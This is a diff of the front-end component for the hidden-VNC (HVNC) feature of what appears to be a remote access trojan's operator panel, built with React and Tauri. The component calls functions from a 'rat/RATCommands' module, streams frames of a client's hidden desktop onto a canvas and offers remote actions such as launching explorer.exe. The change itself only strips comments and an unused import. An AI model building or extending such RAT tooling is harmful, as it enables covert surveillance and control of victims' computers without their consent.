@@ -1,4 +1,4 @@
-import React, { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { listen } from "@tauri-apps/api/event";
 import { manageHVNC } from "../rat/RATCommands";
@@ -14,13 +14,11 @@ export const HVNC = () => {
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const lastFrameRef = useRef<HTMLImageElement | null>(null);
 
-  // UI state
   const [showControls, setShowControls] = useState(true);
   const [showTooltip, setShowTooltip] = useState<string | null>(null);
   const [connectionStatus, setConnectionStatus] =
     useState<string>("Ready to connect");
 
-  // HVNC state
   const [isConnected, setIsConnected] = useState<boolean>(false);
   const [loading, setLoading] = useState<boolean>(false);
   const [selectedAction, setSelectedAction] = useState<string>("explorer.exe");
@@ -29,12 +27,10 @@ export const HVNC = () => {
   useEffect(() => {
     lastFrameRef.current = new Image();
 
-    // Listen for HVNC frames from the backend
     const unlisten = listen("hvnc_frame", (event: any) => {
       if (!isConnected) return;
       const payload = event.payload;
 
-      // Only process frames for the current client
       if (payload.addr === addr) {
         if (canvasRef.current && lastFrameRef.current) {
           const ctx = canvasRef.current.getContext("2d");
@@ -65,10 +61,8 @@ export const HVNC = () => {
     });
 
     return () => {
-      // Cleanup listener when component unmounts
       unlisten.then((unlistenFn) => unlistenFn());
 
-      // Stop HVNC when navigating away
       if (isConnected && addr) {
         stopHVNC();
       }
@@ -90,7 +84,6 @@ export const HVNC = () => {
       setConnectionStatus("Connection failed");
     }
 
-    // Set a timeout to reset loading state if no frames arrive
     setTimeout(() => {
       if (loading) {
         setLoading(false);
@@ -129,7 +122,6 @@ export const HVNC = () => {
     }
   };
 
-  // UI helper functions
   const showToolTip = (tip: string) => {
     setShowTooltip(tip);
   };
@@ -153,7 +145,6 @@ export const HVNC = () => {
 
   return (
     <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
-      {/* Side controls */}
       <div className="fixed top-4 left-4 z-10 flex flex-col gap-3">
         <button
           className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
@@ -176,14 +167,12 @@ export const HVNC = () => {
         </button>
       </div>
 
-      {/* Tooltip */}
       {showTooltip && (
         <div className="fixed top-4 left-20 z-20 bg-black bg-opacity-90 text-white px-3 py-2 rounded-lg text-sm shadow-lg">
           {showTooltip}
         </div>
       )}
 
-      {/* Main controls */}
       {showControls && (
         <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md p-4 rounded-xl shadow-xl text-white max-w-lg w-full">
           <div className="flex w-full justify-between items-center mb-3">
